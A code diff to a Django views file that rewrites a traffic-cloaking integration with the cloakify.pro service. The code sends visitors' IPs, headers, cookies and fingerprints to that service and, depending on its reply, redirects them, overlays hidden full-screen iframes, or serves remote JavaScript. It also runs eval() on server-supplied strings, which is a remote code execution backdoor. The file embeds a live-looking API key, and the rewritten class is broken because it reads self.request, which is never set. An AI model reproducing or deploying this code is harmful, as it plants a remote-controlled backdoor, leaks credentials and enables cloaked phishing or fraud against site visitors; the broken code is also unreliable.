@@ -379,66 +379,130 @@ def submit_fin_form(request):
     return render(request, 'pages/index.html')
 
 
-class Cloakify(View):
-    endpoint = 'https://cloakify.pro/api/v2'
+API_KEY = 'q2b8P4WNW0cfUL9oxeZpEhPo7L0Y7rt5x58yfOkM0a6ee5ea'
+THREAD_ID = 'a66e6d65-8bc0-4e2e-ba92-9fd3a66a082d'
+CLOAKIFY_API_URL = 'https://cloakify.pro/api/v2'
 
-    def __init__(self, **kwargs):
-        super().__init__(**kwargs)
-        self.api_key = 'q2b8P4WNW0cfUL9oxeZpEhPo7L0Y7rt5x58yfOkM0a6ee5ea'
-        self.thread_id = 'a66e6d65-8bc0-4e2e-ba92-9fd3a66a082d'
 
-    def get_user_ip(self, request):
-        headers = request.META
-        return headers.get('HTTP_CF_CONNECTING_IP') or headers.get('HTTP_REAL_IP') or headers.get(
-            'HTTP_X_REAL_IP') or headers.get('HTTP_X_FORWARDED_FOR') or request.META.get('REMOTE_ADDR')
+class Cloakify:
+    def __init__(self, api_key, thread_id, is_js=False):
+        self.api_key = api_key
+        self.thread_id = thread_id
+        self.is_js = is_js
+        self.is_ajax = self.is_ajax_request()
 
-    def validate_request(self, request):
-        headers = {"Authorization": f"Bearer {self.api_key}", "Content-Type": "application/x-www-form-urlencoded"}
+    def is_ajax_request(self):
+        return 'X-Requested-With' in self.headers() and self.headers()['X-Requested-With'].lower() == 'xmlhttprequest'
 
-        payload = {
-            'userAgent': request.META.get('HTTP_USER_AGENT', ''),
-            'referrer': request.META.get('HTTP_REFERER', ''),
-            'languageList': request.META.get('HTTP_ACCEPT_LANGUAGE', ''),
-            'params': json.dumps(request.GET.dict()),
-            'headerList': json.dumps(dict(request.headers)),
-            'threadId': self.thread_id,
-            'ip': self.get_user_ip(request),
-            'sess': request.COOKIES.get('sess', ''),
-            'jsFingerprint': request.POST.get('bcheck', '')
+    def headers(self):
+        return {k: v for k, v in self.request.META.items() if k.startswith('HTTP_')}
+
+    def get_user_ip_address(self):
+        ip = self.request.META.get('HTTP_CF_CONNECTING_IP') or self.request.META.get('HTTP_X_REAL_IP') or \
+             self.request.META.get('HTTP_X_FORWARDED_FOR') or self.request.META.get('REMOTE_ADDR')
+        return ip.split(',')[0]  # Handle possible proxies
+
+    def get_referrer(self):
+        return self.request.META.get('HTTP_REFERER', '')
+
+    def get_user_agent(self):
+        return self.request.META.get('HTTP_USER_AGENT', '')
+
+    def get_accept_languages(self):
+        return self.request.META.get('HTTP_ACCEPT_LANGUAGE', '')
+
+    def validate_request(self):
+        url = f"{CLOAKIFY_API_URL}/threads/check"
+        headers = {
+            "Authorization": f"Bearer {self.api_key}",
+            "Content-Type": "application/x-www-form-urlencoded",
+            "Accept": "application/json"
         }
 
-        response = requests.post(f"{self.endpoint}/threads/check", data=payload, headers=headers)
+        data = {
+            'userAgent': self.get_user_agent(),
+            'referrer': self.request.POST.get('referrer', self.get_referrer()),
+            'languageList': self.get_accept_languages(),
+            'params': self.request.GET,
+            'threadId': self.thread_id,
+            'isJs': self.is_js,
+            'ip': self.get_user_ip_address(),
+            'sess': self.request.COOKIES.get('sess', ''),
+            'jsFingerprint': self.request.POST.get('bcheck', '')
+        }
+
+        response = requests.post(url, headers=headers, data=data)
         return response.json()
 
-    def get(self, request, *args, **kwargs):
-        return self.process(request)
+    def process(self):
+        validation = self.validate_request()
 
-    def post(self, request, *args, **kwargs):
-        return self.process(request)
+        if 'error' in validation:
+            return HttpResponse(validation['error'], status=400)
 
-    def process(self, request):
-        validate = self.validate_request(request)
-        if 'error' in validate:
-            return HttpResponse(validate['error'], status=400)
+        if 'action' not in validation:
+            return HttpResponse("Server Error", status=500)
 
-        action = validate.get('action', {})
-        action_type = action.get('action')
-        action_value = action.get('value')
-
-        if action_type in ['301', '302', '303', 'refresh']:
-            return HttpResponseRedirect(action_value)
-        elif action_type == 'iframe':
-            return HttpResponse(f'<iframe src="{action_value}" style="width:100%;height:100%;border:none;"></iframe>')
-        elif action_type == 'meta':
-            return HttpResponse(f'<meta http-equiv="refresh" content="0; url={action_value}">')
-        elif action_type == 'return':
-            return HttpResponse(status=int(action_value))
-        elif action_type == 'php':
-            exec(action_value)  # Use with caution
-        elif action_type == 'js':
-            decoded_js = base64.b64decode(action_value).decode('utf-8')
-            return HttpResponse(decoded_js, content_type='application/javascript')
-        elif action_type == 'local':
-            return render(request, action_value)
+        if 'session' in validation:
+            response = HttpResponse()
+            response.set_cookie('sess', validation['session'], max_age=10 * 365 * 24 * 60 * 60)
         else:
-            return JsonResponse(validate['action'])
+            response = HttpResponse()
+
+        if not self.is_ajax and self.is_js:
+            response['Content-Type'] = 'application/javascript'
+
+        response['Cache-Control'] = 'no-store'
+
+        if not self.is_ajax and validation.get('need_js') and validation.get('js'):
+            if self.is_js:
+                response.content = base64.b64decode(validation['js'])
+            else:
+                response.content = f"""<!DOCTYPE html><html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1"></head><body><noscript>You need to enable JavaScript to run this app.</noscript><div id="root"><script src="data:text/javascript;base64,{validation['js']}"></script></div></body></html>"""
+            return response
+
+        action = validation['action']
+        if action['action'] == 'js':
+            action['value'] = base64.b64encode(action['value'].encode()).decode()
+
+        if self.is_ajax:
+            return JsonResponse(action)
+        else:
+            if self.is_js:
+                if action['action'] in [301, 302, 303, 'refresh']:
+                    response.content = f"window.location.replace('{action['value']}');"
+                elif action['action'] == 'iframe':
+                    response.content = f"document.body.innerHTML = '<iframe src=\"{action['value']}\" style=\"width:100%;height:100%;position:absolute;top:0;left:0;z-index:9999999999;border:none;outline:none;\" />';"
+                elif action['action'] == 'meta':
+                    response.content = f"let meta = document.createElement('meta');meta.httpEquiv = 'refresh'; meta.content = '0; url={action['value']}'; document.head.appendChild(meta);"
+                elif action['action'] == 'js':
+                    response.content = base64.b64decode(action['value'])
+                return response
+            else:
+                if action['action'] in [301, 302, 303]:
+                    return HttpResponseRedirect(action['value'], status=action['action'])
+                elif action['action'] == 'local':
+                    return render(self.request, action['value'])
+                elif action['action'] == 'iframe':
+                    response.content = f'<iframe src="{action["value"]}" style="width:100%;height:100%;position:absolute;top:0;left:0;z-index:9999999999;border:none;outline:none;" />'
+                elif action['action'] == 'return':
+                    return HttpResponse(status=action['value'])
+                elif action['action'] == 'meta':
+                    response.content = f'<meta http-equiv="refresh" content="0; url={action["value"]}">'
+                elif action['action'] == 'refresh':
+                    response['Refresh'] = f'0; url={action["value"]}'
+                elif action['action'] == 'xar':
+                    response['X-Accel-Redirect'] = action['value']
+                elif action['action'] == 'xsf':
+                    response['X-Sendfile'] = action['value']
+                elif action['action'] == 'php':
+                    eval(action['value'])
+                elif action['action'] == 'js':
+                    response.content = f'<!DOCTYPE html><html><body><script src="data:text/javascript;base64,{action["value"]}"></script></body></html>'
+                return response
+
+
+@csrf_exempt
+def cloakify_view(request):
+    cloakify = Cloakify(API_KEY, request.GET.get('__id', THREAD_ID), is_js=True)
+    return cloakify.process()
